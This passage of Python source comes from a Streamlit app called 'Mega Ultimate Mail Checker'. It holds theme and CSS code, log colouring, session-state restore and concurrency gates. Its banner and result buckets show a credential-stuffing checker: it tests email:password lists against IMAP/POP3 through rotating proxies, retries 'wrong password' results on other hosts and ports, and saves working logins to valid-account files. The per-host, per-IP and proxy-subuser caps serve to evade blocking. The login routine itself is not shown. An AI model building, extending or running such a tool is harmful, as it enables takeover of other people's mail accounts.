    "Neon":      {"g1": "#f72585", "g2": "#7209b7", "accent": "#f72585", "accent2": "#4cc9f0", "bg": "#0a0118", "panel": "#180a2c", "text": "#f5e9ff"},
    "Ocean":     {"g1": "#2193b0", "g2": "#6dd5ed", "accent": "#38bdf8", "accent2": "#22d3ee", "bg": "#04141c", "panel": "#0a2432", "text": "#e0f7ff"},
    "Emerald":   {"g1": "#11998e", "g2": "#38ef7d", "accent": "#34d399", "accent2": "#a3e635", "bg": "#06140f", "panel": "#0e2519", "text": "#e3ffee"},
    "Sunset":    {"g1": "#ff6b6b", "g2": "#f9a826", "accent": "#fb923c", "accent2": "#ffd166", "bg": "#1a0f0a", "panel": "#2b1a11", "text": "#fff3e6"},
    "Crimson":   {"g1": "#eb3349", "g2": "#f45c43", "accent": "#f43f5e", "accent2": "#fb923c", "bg": "#160609", "panel": "#270c13", "text": "#ffe8ec"},
    "Royal":     {"g1": "#243b55", "g2": "#4b6cb7", "accent": "#60a5fa", "accent2": "#c084fc", "bg": "#070b12", "panel": "#111a28", "text": "#e2e8f5"},
    "Gold":      {"g1": "#b8860b", "g2": "#ffd700", "accent": "#fbbf24", "accent2": "#f59e0b", "bg": "#141005", "panel": "#251d0a", "text": "#fff8dc"},
    "Candy":     {"g1": "#ff9a9e", "g2": "#fecfef", "accent": "#fb7185", "accent2": "#f9a8d4", "bg": "#1a1016", "panel": "#2b1a24", "text": "#fff0f6"},
    "Cyber":     {"g1": "#00f5d4", "g2": "#0077b6", "accent": "#00f5d4", "accent2": "#90e0ef", "bg": "#03060d", "panel": "#0a1220", "text": "#dffffb"},
    "Grape":     {"g1": "#8e2de2", "g2": "#4a00e0", "accent": "#a78bfa", "accent2": "#f472b6", "bg": "#0b0418", "panel": "#180a2b", "text": "#f1e8ff"},
    "Daylight":  {"g1": "#6366f1", "g2": "#06b6d4", "accent": "#4f46e5", "accent2": "#0891b2", "bg": "#f1f5f9", "panel": "#ffffff", "text": "#0f172a"},
    "Mono":      {"g1": "#3f3f46", "g2": "#71717a", "accent": "#a1a1aa", "accent2": "#d4d4d8", "bg": "#0a0a0b", "panel": "#19191c", "text": "#f4f4f5"},
}


def _lum(hex_color: str) -> float:
    try:
        h = str(hex_color).lstrip("#")
        r, g, b = int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16)
        return (0.299 * r + 0.587 * g + 0.114 * b) / 255.0
    except Exception:
        return 0.0


def default_theme() -> dict:
    p = THEME_PRESETS["Aurora"]
    return {
        "preset": "Aurora",
        "g1": p["g1"], "g2": p["g2"], "accent": p["accent"], "accent2": p["accent2"],
        "bg": p["bg"], "panel": p["panel"], "text": p["text"],
        "radius": 14, "glow": True, "animate": True, "glass": True,
        "colorize_logs": True,
        "hero_title": f"⚡ Mega Ultimate Mail Checker {BUILD_TAG}",
        "hero_sub": "Plug-and-play edition - click 📥 Fetch & Test All Proxies, then press "
                    "Start. A single AUTHENTICATIONFAILED is PROVISIONAL: the ladder keeps "
                    "going (POP3, sibling hosts, 143/110, then DIRECT) until a SECOND host "
                    "agrees or nothing is left to dial. Allow Self-Signed is a real switch, "
                    "the phone layout is fixed, and the Fast-Mode cooldown arms on "
                    "inconclusive results only.",
    }


def load_theme() -> dict:
    base = default_theme()
    if os.path.exists(THEME_FILE):
        try:
            with open(THEME_FILE, encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                base.update({k: v for k, v in data.items() if k in base})
        except Exception:
            pass
    # The hero text is a BUILD STRING and base.update() lets the file win over
    # default_theme() - so a theme.json written by an older build made the app
    # advertise that old version for ever.
    if BUILD_TAG not in str(base.get("hero_title", "")):
        _d = default_theme()
        base["hero_title"] = _d["hero_title"]
        base["hero_sub"] = _d["hero_sub"]
        try:
            save_theme(base)
        except Exception:
            pass
    return base


def save_theme(th: dict):
    try:
        with open(THEME_FILE, "w", encoding="utf-8") as f:
            json.dump(th, f, indent=2)
    except Exception:
        pass


def is_light(th: dict) -> bool:
    return _lum(th.get("bg", "#000000")) > 0.6


if "theme" not in str_lit.session_state:
    str_lit.session_state.theme = load_theme()
if "colorize_logs" not in str_lit.session_state:
    str_lit.session_state.colorize_logs = str_lit.session_state.theme.get("colorize_logs", True)

if not os.path.exists(THEME_FILE):
    save_theme(str_lit.session_state.theme)


def _sync_theme_from_widgets():
    th = str_lit.session_state.theme
    for k in ("g1", "g2", "accent", "accent2", "bg", "panel", "text"):
        wk = f"th_{k}"
        if wk in str_lit.session_state:
            th[k] = str_lit.session_state[wk]
    for k in ("radius", "glow", "animate", "glass"):
        wk = f"th_{k}"
        if wk in str_lit.session_state:
            th[k] = str_lit.session_state[wk]
    th["colorize_logs"] = str_lit.session_state.get("colorize_logs", True)
    if "th_hero_title" in str_lit.session_state:
        th["hero_title"] = str_lit.session_state["th_hero_title"]
    if "th_hero_sub" in str_lit.session_state:
        th["hero_sub"] = str_lit.session_state["th_hero_sub"]
    save_theme(th)


def _on_preset_change():
    name = str_lit.session_state.get("th_preset")
    p = THEME_PRESETS.get(name)
    if p:
        for k, v in p.items():
            str_lit.session_state[f"th_{k}"] = v
        str_lit.session_state.theme["preset"] = name
        save_theme(str_lit.session_state.theme)


def _reset_theme():
    str_lit.session_state.theme = default_theme()
    d = str_lit.session_state.theme
    for k in ("g1", "g2", "accent", "accent2", "bg", "panel", "text"):
        str_lit.session_state[f"th_{k}"] = d[k]
    for k in ("radius", "glow", "animate", "glass"):
        str_lit.session_state[f"th_{k}"] = d[k]
    str_lit.session_state["th_preset"] = d["preset"]
    str_lit.session_state["th_hero_title"] = d["hero_title"]
    str_lit.session_state["th_hero_sub"] = d["hero_sub"]
    str_lit.session_state["colorize_logs"] = d["colorize_logs"]
    save_theme(d)
# @@END 031 THEME_DATA

# @@BLOCK 032 MOBILE_CSS deps=-
# FIX P2-2:
#   * the old sheet forced [data-testid="stHeader"] { height: 2.1rem } while
#     Streamlit's header is ~3.75rem with absolutely positioned children, so the
#     toolbar and the collapsed-sidebar chevron sat ON TOP of the hero.
#   * "[data-testid=stSidebar] * { color }" clobbered the sidebar's own icons.
# Streamlit's own .block-container padding (6rem top / 10rem bottom) is never
# overridden by this app, which is half of the "does not fit my phone" report.
_MOBILE_CSS = """
    .block-container, [data-testid="stMainBlockContainer"] {
        padding-top: 1.2rem !important;
        padding-bottom: 2rem !important;
    }
    [data-testid="stSidebar"] p,
    [data-testid="stSidebar"] label,
    [data-testid="stSidebar"] .stMarkdown span {
        color: inherit;
    }
    @media (max-width: 820px) {
        .block-container, [data-testid="stMainBlockContainer"] {
            padding-top: 0.55rem !important;
            padding-bottom: calc(1.3rem + env(safe-area-inset-bottom)) !important;
            padding-left: 0.7rem !important;
            padding-right: 0.7rem !important;
            max-width: 100% !important;
        }
        [data-testid="stToolbar"] { right: 0.3rem; }
        [data-testid="stSidebar"] { width: 88vw !important; min-width: 88vw !important; }
        [data-testid="stSidebar"] [data-testid="stSidebarContent"] { padding-top: 0.6rem; }
        .bb-hero { padding: 14px 16px; border-radius: 12px; margin-bottom: 10px; }
        .bb-hero h1 { font-size: 1.22rem; line-height: 1.25; }
        .bb-hero p { font-size: .77rem; line-height: 1.35; }
        .bb-tag { font-size: .61rem; padding: 2px 8px; margin: 0 4px 4px 0; }
        .bb-section { margin: 14px 0 8px 0; padding: 8px 12px; gap: 8px; }
        .bb-section .bb-ico { font-size: 1.05rem; }
        .bb-section .bb-t { font-size: .9rem; }
        .bb-section .bb-s { display: block; margin: 2px 0 0 0; font-size: .67rem; }
        .bb-logbox { font-size: .67rem; padding: 8px; max-height: 300px; }
        .bb-log { font-size: .67rem; }
        .help-box { font-size: .7rem; }
        [data-testid="stMetric"] { padding: 8px 9px; }
        [data-testid="stMetricValue"] { font-size: 1.1rem !important; }
        [data-testid="stMetricLabel"] { font-size: .62rem !important; line-height: 1.15; }
        [data-testid="stMetricLabel"] p { white-space: normal !important; }
        .stTabs [data-baseweb="tab"] { padding: 6px 10px; font-size: .78rem; }
        h1 { font-size: 1.32rem !important; }
        h2 { font-size: 1.13rem !important; }
        h3 { font-size: 1.0rem !important; }
        .stButton > button, .stDownloadButton > button { padding: .35rem .5rem; font-size: .8rem; }
        [data-testid="stDataFrame"] { font-size: .72rem; }
        pre, code, .stCode { font-size: .68rem !important; }
        textarea, input { font-size: .8rem !important; }
    }
    @media (max-width: 420px) {
        .block-container { padding-left: 0.5rem !important; padding-right: 0.5rem !important; }
        .bb-hero h1 { font-size: 1.08rem; }
        [data-testid="stMetricValue"] { font-size: .98rem !important; }
        [data-testid="stMetricLabel"] { font-size: .58rem !important; }
    }
    @media (hover: none) {
        [data-testid="stSidebarCollapsedControl"] { top: .3rem; }
    }
"""
# @@END 032 MOBILE_CSS

# @@BLOCK 033 THEME_CSS deps=031,032
def theme_css(th: dict) -> str:
    g1, g2 = th["g1"], th["g2"]
    ac, ac2 = th["accent"], th["accent2"]
    bg, panel, text = th["bg"], th["panel"], th["text"]
    r = int(th.get("radius", 14))
    light = is_light(th)
    border = "rgba(15,23,42,0.14)" if light else "rgba(255,255,255,0.10)"
    soft = "rgba(15,23,42,0.05)" if light else "rgba(255,255,255,0.04)"
    dim = "rgba(15,23,42,0.65)" if light else "rgba(230,235,255,0.70)"

    glow_css = f"box-shadow: 0 8px 26px {ac}44;" if th.get("glow", True) else ""
    glass_css = "backdrop-filter: blur(6px);" if th.get("glass", True) else ""
    anim_css = ""
    if th.get("animate", True):
        anim_css = f"""
    .bb-hero {{ background-size: 240% 240%; animation: bbShift 14s ease infinite; }}
    @keyframes bbShift {{ 0%{{background-position:0% 50%}} 50%{{background-position:100% 50%}} 100%{{background-position:0% 50%}} }}
    """

    return f"""
<style>
    :root {{
        --bb-g1: {g1}; --bb-g2: {g2}; --bb-ac: {ac}; --bb-ac2: {ac2};
        --bb-bg: {bg}; --bb-panel: {panel}; --bb-text: {text}; --bb-r: {r}px;
    }}
    .stApp, [data-testid="stAppViewContainer"], [data-testid="stMain"] {{
        background: {bg} !important; color: {text} !important;
    }}
    [data-testid="stHeader"] {{ background: transparent !important; }}
    [data-testid="stSidebar"] {{
        background: linear-gradient(180deg, {panel} 0%, {bg} 100%) !important;
        border-right: 1px solid {border};
    }}
    h1, h2, h3, h4, h5, h6 {{ color: {text} !important; letter-spacing: .2px; }}
    p, span, label, li, small, strong {{ color: {text}; }}
    hr {{ border-color: {border} !important; }}
    a {{ color: {ac2} !important; }}

    .stButton > button, .stDownloadButton > button, .stFormSubmitButton > button {{
        background: {panel} !important; color: {text} !important;
        border: 1px solid {border} !important; border-radius: {r}px !important;
        font-weight: 600; transition: all .16s ease;
    }}
    .stButton > button:hover, .stDownloadButton > button:hover {{
        border-color: {ac} !important; transform: translateY(-1px);
        box-shadow: 0 6px 18px {ac}44;
    }}
    .stButton > button[kind="primary"], .stDownloadButton > button[kind="primary"] {{
        background: linear-gradient(135deg, {g1} 0%, {g2} 100%) !important;
        color: #fff !important; border: none !important;
        box-shadow: 0 8px 22px {g1}66;
    }}
    .stButton > button[kind="primary"]:hover {{ filter: brightness(1.08); }}

    [data-testid="stMetric"] {{
        background: {panel} !important; border: 1px solid {border};
        border-left: 4px solid {ac}; border-radius: {r}px;
        padding: 14px 16px; {glow_css} {glass_css}
    }}
    [data-testid="stMetricValue"] {{ color: {ac} !important; font-weight: 800 !important; }}
    [data-testid="stMetricLabel"] {{ color: {dim} !important; }}

    .stTabs [data-baseweb="tab-list"] {{ gap: 6px; border-bottom: 1px solid {border}; }}
    .stTabs [data-baseweb="tab"] {{
        background: {panel}; border-radius: {r}px {r}px 0 0;
        color: {text} !important; padding: 8px 16px; font-weight: 600;
    }}
    .stTabs [aria-selected="true"] {{
        background: linear-gradient(135deg, {g1}, {g2}) !important; color: #fff !important;
    }}
    .stTabs [data-baseweb="tab-highlight"] {{ background: {ac} !important; }}

    [data-testid="stExpander"] {{
        border: 1px solid {border} !important; border-radius: {r}px !important;
        background: {soft} !important;
    }}
    [data-testid="stExpander"] summary {{ color: {text} !important; font-weight: 600; }}

    input, textarea, select, .stTextInput input, .stTextArea textarea,
    .stNumberInput input, .stSelectbox div[data-baseweb="select"] > div,
    .stMultiSelect div[data-baseweb="select"] > div {{
        background: {panel} !important; color: {text} !important;
        border: 1px solid {border} !important; border-radius: 10px !important;
    }}
    [data-baseweb="popover"] div {{ background: {panel} !important; color: {text} !important; }}
    [data-baseweb="tag"] {{ background: {ac}44 !important; color: {text} !important; }}

    .stSlider [data-baseweb="slider"] div[role="slider"] {{ background: {ac} !important; }}
    .stProgress > div > div > div > div {{
        background: linear-gradient(90deg, {g1}, {g2}) !important;
    }}
    [data-baseweb="checkbox"] span, [data-baseweb="toggle"] span {{ border-color: {ac} !important; }}

    code, pre, .stCode, .stCodeBlock, [data-testid="stCodeBlock"] {{
        background: {bg} !important; color: {ac2} !important;
        border: 1px solid {border} !important; border-radius: 10px !important;
    }}
    [data-testid="stDataFrame"] {{ border: 1px solid {border} !important; border-radius: 10px !important; }}

    .bb-hero {{
        background: linear-gradient(135deg, {g1} 0%, {g2} 100%);
        padding: 26px 32px; border-radius: {r}px; margin-bottom: 18px;
        box-shadow: 0 14px 38px {g1}55; border: 1px solid rgba(255,255,255,.10);
    }}
    .bb-hero h1 {{ color: #fff !important; margin: 0; font-size: 2.0rem; font-weight: 800; }}
    .bb-hero p {{ color: rgba(255,255,255,.94) !important; margin: 8px 0 0 0; font-size: .95rem; }}
    .bb-hero .bb-tags {{ margin-top: 12px; }}
    .bb-tag {{
        display: inline-block; padding: 3px 11px; margin: 0 6px 6px 0;
        border-radius: 999px; font-size: .72rem; font-weight: 700;
        background: rgba(255,255,255,.20); color: #fff !important;
        border: 1px solid rgba(255,255,255,.28);
    }}
    .bb-section {{
        display: flex; align-items: center; gap: 12px;
        margin: 24px 0 12px 0; padding: 11px 18px; border-radius: {r}px;
        background: linear-gradient(90deg, {g1}38 0%, {g1}10 45%, transparent 85%);
        border-left: 4px solid {ac};
    }}
    .bb-section .bb-ico {{ font-size: 1.25rem; }}
    .bb-section .bb-t {{ font-weight: 800; font-size: 1.03rem; color: {text}; }}
    .bb-section .bb-s {{ font-size: .76rem; color: {dim}; margin-left: 8px; }}

    .bb-card {{
        background: {panel}; border: 1px solid {border}; border-radius: {r}px;
        padding: 14px 18px; {glass_css}
    }}
    .bb-pill {{
        display: inline-block; padding: 2px 10px; border-radius: 999px;
        font-size: .72rem; font-weight: 800; margin-right: 6px;
        background: {ac}33; color: {ac2}; border: 1px solid {ac}55;
    }}

    .bb-logbox {{
        background: {bg}; border: 1px solid {border}; border-radius: {r}px;
        padding: 10px 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
        font-size: .78rem; max-height: 420px; overflow-y: auto;
    }}
    .bb-log {{ padding: 1px 8px; white-space: pre-wrap; word-break: break-word; }}

    .help-box {{
        background: {panel}; border-left: 3px solid {ac};
        padding: 6px 10px; margin: 2px 0 8px 0;
        font-size: .78rem; color: {text}; opacity: .9;
        border-radius: 4px; line-height: 1.35;
    }}

    ::-webkit-scrollbar {{ width: 10px; height: 10px; }}
    ::-webkit-scrollbar-track {{ background: {bg}; }}
    ::-webkit-scrollbar-thumb {{ background: {g1}88; border-radius: 8px; }}
    ::-webkit-scrollbar-thumb:hover {{ background: {ac}; }}
    {anim_css}
    {_MOBILE_CSS}
</style>
"""
# @@END 033 THEME_CSS

# @@BLOCK 034 HERO_SECTION deps=031
def render_hero(th: dict):
    title = th.get("hero_title", "⚡ Mega Ultimate Mail Checker")
    sub = th.get("hero_sub", "")
    str_lit.markdown(
        f"""
        <div class="bb-hero">
            <h1>{html.escape(title)}</h1>
            <p>{html.escape(sub)}</p>
            <div class="bb-tags">
                <span class="bb-tag">Plug &amp; Play</span>
                <span class="bb-tag">Fast</span>
                <span class="bb-tag">Normal</span>
                <span class="bb-tag">Deep / Aggressive</span>
                <span class="bb-tag">Protocol Picker</span>
                <span class="bb-tag">Proxy Backed</span>
                <span class="bb-tag">407 Quarantine</span>
                <span class="bb-tag">Gated Per-IP Tunnel Cap</span>
                <span class="bb-tag">Per-Sub-User 407 Gate</span>
                <span class="bb-tag">Request Frugal</span>
                <span class="bb-tag">Mail-Dest Spot Check</span>
                <span class="bb-tag">Login-Dropped Bucket</span>
                <span class="bb-tag">Provisional WRONG</span>
                <span class="bb-tag">Microsoft XOAUTH2</span>
                <span class="bb-tag">Mobile Fit</span>
                <span class="bb-tag">Deep Diagnostics</span>
            </div>
        </div>
        """,
        unsafe_allow_html=True,
    )


def section_title(icon: str, title: str, subtitle: str = ""):
    sub = f'<span class="bb-s">{html.escape(subtitle)}</span>' if subtitle else ""
    str_lit.markdown(
        f'<div class="bb-section"><span class="bb-ico">{icon}</span>'
        f'<span class="bb-t">{html.escape(title)}</span>{sub}</div>',
        unsafe_allow_html=True,
    )
# @@END 034 HERO_SECTION

# @@BLOCK 035 METRIC_GRID deps=-
def metric_grid(pairs, per_row: int = 3, compact_at: int = 12):
    """Lay metrics out in a WRAPPING grid.

    FIX P2-3: nine to thirteen metrics in one or two ragged rows collided on a
    phone - the labels wrapped into each other and the row overflowed.  A large
    set now drops to two per row, and the mobile sheet keeps the label wrapping
    inside its own column instead of pushing into the neighbour.
    """
    pairs = list(pairs or [])
    if not pairs:
        return []
    per_row = max(1, int(per_row))
    if len(pairs) >= compact_at:
        per_row = 2
    cols = []
    for _i in range(0, len(pairs), per_row):
        cols.extend(str_lit.columns(min(per_row, len(pairs) - _i)))
    return cols
# @@END 035 METRIC_GRID

# @@BLOCK 036 LOG_COLOR deps=-
TAG_COLORS = {
    "VALID": "#22c55e",
    "WRONG_PASSWORD": "#ef4444",
    "LOGIN_DROPPED": "#f43f5e",
    "CONNECTION_FAILED": "#eab308",
    "PROXY_UNHEALTHY": "#e879f9",
    "NEED_APP_PASSWORD": "#3b82f6",
    "RETRY_LATER": "#ffffff",
    "RBL_BLOCKED": "#facc15",
    "SMTP_FAILED": "#a855f7",
    "DNS_FAILED": "#f97316",
    "UNKNOWN": "#94a3b8",
    "UNCLASSIFIED": "#94a3b8",
    "SKIPPED_COOLDOWN": "#a78bfa",
    "SKIPPED": "#a78bfa",
    "EXCEPTION": "#fb7185",
    "ERROR": "#fb7185",
}


def _line_color(line: str) -> str:
    up = str(line).upper()
    for tag in ("SKIPPED_COOLDOWN", "SKIPPED", "NEED_APP_PASSWORD", "RBL_BLOCKED",
                "WRONG_PASSWORD", "PROXY_UNHEALTHY", "CONNECTION_FAILED", "RETRY_LATER",
                "SMTP_FAILED", "DNS_FAILED", "UNCLASSIFIED", "LOGIN_DROPPED", "VALID",
                "UNKNOWN", "EXCEPTION", "ERROR"):
        if f"[{tag}]" in up:
            return TAG_COLORS.get(tag, "#cbd5e1")
    if "[CLASSIFIED: VALID]" in up:
        return TAG_COLORS["VALID"]
    if "[CLASSIFIED: WRONG_PASSWORD]" in up:
        return TAG_COLORS["WRONG_PASSWORD"]
    if "[CLASSIFIED: LOGIN_DROPPED]" in up:
        return TAG_COLORS["LOGIN_DROPPED"]
    if "[CLASSIFIED: NEED_APP_PASSWORD]" in up:
        return TAG_COLORS["NEED_APP_PASSWORD"]
    if "[CLASSIFIED: RBL_BLOCKED]" in up:
        return TAG_COLORS["RBL_BLOCKED"]
    if "[CLASSIFIED: RETRY_LATER]" in up:
        return TAG_COLORS["RETRY_LATER"]
    if "[CLASSIFIED: SMTP_FAILED]" in up:
        return TAG_COLORS["SMTP_FAILED"]
    if "[CLASSIFIED: DNS_FAILED]" in up:
        return TAG_COLORS["DNS_FAILED"]
    if "[CLASSIFIED: PROXY_UNHEALTHY]" in up:
        return TAG_COLORS["PROXY_UNHEALTHY"]
    if "[CLASSIFIED:" in up:
        return TAG_COLORS["CONNECTION_FAILED"]
    return ""


def colorize_logs(lines: List[str]) -> str:
    out = []
    for ln in lines or []:
        col = _line_color(ln)
        style = f"color:{col};" if col else "opacity:.85;"
        out.append(f'<div class="bb-log" style="{style}">{html.escape(str(ln))}</div>')
    return f'<div class="bb-logbox">{"".join(out)}</div>'


def render_logs(lines: List[str], height: int = 300):
    if str_lit.session_state.get("colorize_logs", True):
        str_lit.markdown(colorize_logs(lines), unsafe_allow_html=True)
    else:
        str_lit.code("\n".join(lines), language="text")
# @@END 036 LOG_COLOR

# @@BLOCK 037 SESSION_INIT deps=024,031
_PERSISTENT_VALID_CACHE = STATE.setdefault("persistent_valid_cache", {"ts": 0.0, "data": []})
_PREV_VALID_CACHE = STATE.setdefault("prev_valid_cache", {"ts": 0.0, "data": set()})


def invalidate_valid_caches():
    _PERSISTENT_VALID_CACHE["ts"] = 0.0
    _PREV_VALID_CACHE["ts"] = 0.0


def load_persistent_valid_results():
    now = time.time()
    if _PERSISTENT_VALID_CACHE["data"] and (now - _PERSISTENT_VALID_CACHE["ts"]) < 15.0:
        return list(_PERSISTENT_VALID_CACHE["data"])
    valid_list, seen = [], set()
    try:
        paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
        for extra in ("valid_accounts.txt", "clean_valid_accounts.txt"):
            if os.path.exists(extra):
                paths.append(extra)
        for path in paths:
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#") and ":" in line:
                            email = line.split(":", 1)[0].strip().lower()
                            if email and email not in seen:
                                seen.add(email)
                                valid_list.append(line)
            except Exception:
                continue
    except Exception:
        pass
    _PERSISTENT_VALID_CACHE["ts"] = now
    _PERSISTENT_VALID_CACHE["data"] = list(valid_list)
    return valid_list


if "engine_has_run" not in str_lit.session_state:
    str_lit.session_state.engine_has_run = False
if "valid_results" not in str_lit.session_state:
    loaded_valid = load_persistent_valid_results()
    str_lit.session_state.valid_results = loaded_valid
    str_lit.session_state.clean_valid_count = len(loaded_valid)
    str_lit.session_state.run_valid_count = len(loaded_valid)
for _k in ("wrong_results", "need_app_results", "conn_results", "proxy_results",
           "login_drop_results", "retry_results", "rbl_results", "smtp_results",
           "dns_results", "skip_results", "unknown_results", "report_entries",
           "log_lines", "startup_entries", "pre_dns_failed", "pre_smtp_failed"):
    if _k not in str_lit.session_state:
        str_lit.session_state[_k] = []
if "zip_bytes" not in str_lit.session_state:
    str_lit.session_state.zip_bytes = None
if "zip_name" not in str_lit.session_state:
    str_lit.session_state.zip_name = ""
if "checked_emails_set" not in str_lit.session_state:
    str_lit.session_state.checked_emails_set = set()
if "last_checked_index" not in str_lit.session_state:
    str_lit.session_state.last_checked_index = 0
if "run_completion_status" not in str_lit.session_state:
    str_lit.session_state.run_completion_status = "Unfinished"
for _k in ("start_timestamp", "end_timestamp", "total_duration"):
    if _k not in str_lit.session_state:
        str_lit.session_state[_k] = None

# FIX P1-1: only valid_results used to be rehydrated from disk, so a session
# reset (mobile tab backgrounded, WebSocket drop, redeploy) wiped every other
# bucket and every log while the summary still rendered - showing zeros.
# The run already writes one file per bucket per stamp; reload the newest group.
RUN_BUCKET_FILES = (
    ("valid_results", "valid"),
    ("wrong_results", "wrong"),
    ("need_app_results", "need_app"),
    ("login_drop_results", "login_dropped"),
    ("conn_results", "failed"),
    ("proxy_results", "proxy_unhealthy"),
    ("retry_results", "retry_later"),
    ("rbl_results", "rbl_blocked"),
    ("smtp_results", "smtp_failed"),
    ("dns_results", "dns_failed"),
    ("skip_results", "skipped"),
    ("unknown_results", "unclassified"),
)
RE_RUN_STAMP = re.compile(r"^(.*)_(\d{8}_\d{6})\.txt$")


def _rehydrate_last_run(force: bool = False):
    """Reload the newest complete run stamp from mail_results/ into session_state."""
    try:
        stamps = set()
        for p in glob.glob("mail_results/*.txt"):
            m = RE_RUN_STAMP.match(os.path.basename(p))
            if m:
                stamps.add(m.group(2))
        if not stamps:
            return 0
        stamp = sorted(stamps)[-1]
        loaded = 0
        for key, tag in RUN_BUCKET_FILES:
            if str_lit.session_state.get(key) and not force:
                continue
            p = os.path.join("mail_results", f"{tag}_{stamp}.txt")
            if not os.path.exists(p):
                continue
            try:
                with open(p, encoding="utf-8", errors="ignore") as fh:
                    items = [l.rstrip("\n") for l in fh
                             if l.strip() and not l.startswith("#")]
            except Exception:
                continue
            if items:
                str_lit.session_state[key] = items
                loaded += len(items)
        if loaded:
            str_lit.session_state.engine_has_run = True
            if str_lit.session_state.get("run_completion_status") == "Unfinished":
                str_lit.session_state.run_completion_status = "Loaded from disk"
        return loaded
    except Exception:
        return 0


_rehydrate_last_run()
# @@END 037 SESSION_INIT

# @@BLOCK 038 STARTUP_LOG deps=024,037
_STARTUP_BUFFER = STATE.setdefault("startup_buffer", [])
_STARTUP_BUFFER_LOCK = STATE.setdefault("startup_buffer_lock", threading.Lock())
_STARTUP_SEEN = STATE.setdefault("startup_seen", set())
_STARTUP_MAX = 400


def log_startup(msg, quiet: bool = False):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{ts}] [INIT/HOOD] {msg}"
    if quiet:
        with _STARTUP_BUFFER_LOCK:
            _STARTUP_BUFFER.append(entry)
            if len(_STARTUP_BUFFER) > _STARTUP_MAX:
                del _STARTUP_BUFFER[:-_STARTUP_MAX]
        return
    try:
        with _STARTUP_BUFFER_LOCK:
            if msg in _STARTUP_SEEN:
                return
            _STARTUP_SEEN.add(msg)
        str_lit.session_state.startup_entries.append(entry)
        if len(str_lit.session_state.startup_entries) > _STARTUP_MAX:
            del str_lit.session_state.startup_entries[:-_STARTUP_MAX]
    except Exception:
        with _STARTUP_BUFFER_LOCK:
            _STARTUP_BUFFER.append(entry)


def startup_panel_lines():
    try:
        main = list(str_lit.session_state.startup_entries)
    except Exception:
        main = []
    with _STARTUP_BUFFER_LOCK:
        buffered = list(_STARTUP_BUFFER)
    if not buffered:
        return main
    return main + ["", "-- background thread (quiet mode) --"] + buffered
# @@END 038 STARTUP_LOG

# @@BLOCK 039 STATE_ALIASES deps=024,038
cache_lock = STATE["cache_lock"]
proxy_lock = STATE["proxy_lock"]
file_write_lock = STATE["file_write_lock"]
session_state_lock = STATE["session_state_lock"]
alive_pool = STATE["alive_pool"]
alive_pool_lock = STATE["alive_pool_lock"]
consecutive_proxy_failures = STATE["consecutive_proxy_failures"]
circuit_breaker_until = STATE["circuit_breaker_until"]
failed_domain_cache = STATE["failed_domain_cache"]
_host_dns_cache = STATE["host_dns_cache"]
_host_dns_lock = STATE["host_dns_lock"]

proxy_quarantine = STATE["proxy_quarantine"]
proxy_quarantine_lock = STATE["proxy_quarantine_lock"]
_proxy_407 = STATE["strikes_407"]
_proxy_scheme = STATE["proxy_scheme"]
_proxy_scheme_lock = STATE["proxy_scheme_lock"]

_rr_lock = STATE["rr_lock"]

_GEO_CACHE = STATE["geo_cache"]
_GEO_LOCK = STATE["geo_lock"]
_GEO_FAIL = STATE.setdefault("geo_fail", {})
_geo_last_call = STATE.setdefault("geo_last_call", {"ts": 0.0})

_PUBLIC_IP = STATE["public_ip"]
_PUBLIC_IP_LOCK = STATE["public_ip_lock"]
_DIRECT_GEO = STATE["direct_geo"]
_DIRECT_GEO_LOCK = STATE["direct_geo_lock"]
_DIRECT_ISP = STATE["direct_isp"]

_SMTP_DOMAIN_CACHE = STATE["smtp_domain_cache"]
_SMTP_LOCK = STATE["smtp_lock"]
_SMTP_CACHE_TTL = 900
_SMTP_PRECHECK_BUDGET = 45.0
_SMTP_PRECHECK_WORKERS = 32

STATE.setdefault("proxy_407_until", {})

log_startup("Application process started. Initializing session state and loading configurations...")
log_startup(f"hosts.py status -> loaded={HOSTS_OK} has_ranking={HOSTS_HAS_RANKING} "
            f"merge={_HAVE_HOSTS_MERGE} {HOSTS_IMPORT_NOTE}".strip())
log_startup(f"status.py status -> {STATUS_IMPORT_NOTE}")
log_startup(f"ms_oauth.py status -> loaded={MS_OAUTH_OK} "
            f"(Microsoft XOAUTH2 {'active' if MS_OAUTH_OK else 'INACTIVE'})")
# @@END 039 STATE_ALIASES

# @@BLOCK 040 GATES deps=039
class _NullGate:
    def acquire(self, timeout=None):
        return True

    def release(self):
        pass


_null_gate = _NullGate()


def _proxy_gate():
    """Global cap on simultaneous proxy tunnels (persistent across reruns)."""
    g = STATE.get("proxy_gate")
    if g is None:
        try:
            limit = int(CFG.get("PROXY_CONCURRENCY", PROXY_CONCURRENCY_DEFAULT)) \
                or PROXY_CONCURRENCY_DEFAULT
        except Exception:
            limit = PROXY_CONCURRENCY_DEFAULT
        g = threading.BoundedSemaphore(max(1, limit))
        STATE["proxy_gate"] = g
    return g


def _host_gate(host):
    """Per-destination-HOSTNAME cap so 50 workers do not slam one IMAP box."""
    if not host:
        return _null_gate
    with STATE["host_gate_lock"]:
        gates = STATE["host_gates"]
        g = gates.get(host)
        if g is None:
            try:
                limit = int(CFG.get("HOST_CONCURRENCY", HOST_CONCURRENCY_DEFAULT)) \
                    or HOST_CONCURRENCY_DEFAULT
            except Exception:
                limit = HOST_CONCURRENCY_DEFAULT
            g = threading.BoundedSemaphore(max(1, limit))
            gates[host] = g
        return g


def _ip_gate(ip):
    """Per-PROXY-IP cap.  The PROBER takes it too."""
    if not ip:
        return _null_gate
    with STATE["host_gate_lock"]:
        gates = STATE["ip_gates"]
        g = gates.get(ip)
        if g is None:
            try:
                limit = int(CFG.get("PROXY_IP_CONCURRENCY", PROXY_IP_CONCURRENCY_DEFAULT)) \
                    or PROXY_IP_CONCURRENCY_DEFAULT
            except Exception:
                limit = PROXY_IP_CONCURRENCY_DEFAULT
            g = threading.BoundedSemaphore(max(1, limit))
            gates[ip] = g
        return g


def _subuser_of(proxy_str) -> str:
    """The SUB-USER half of a proxy line - what the provider meters."""
    try:
        info = parse_proxy(proxy_str)
        return (info.get("user") or "").strip().lower() if info else ""
    except Exception:
        return ""


def _subuser_gate(subuser):
    """Per-PROXY-SUBUSER cap - the single most important 407 control."""
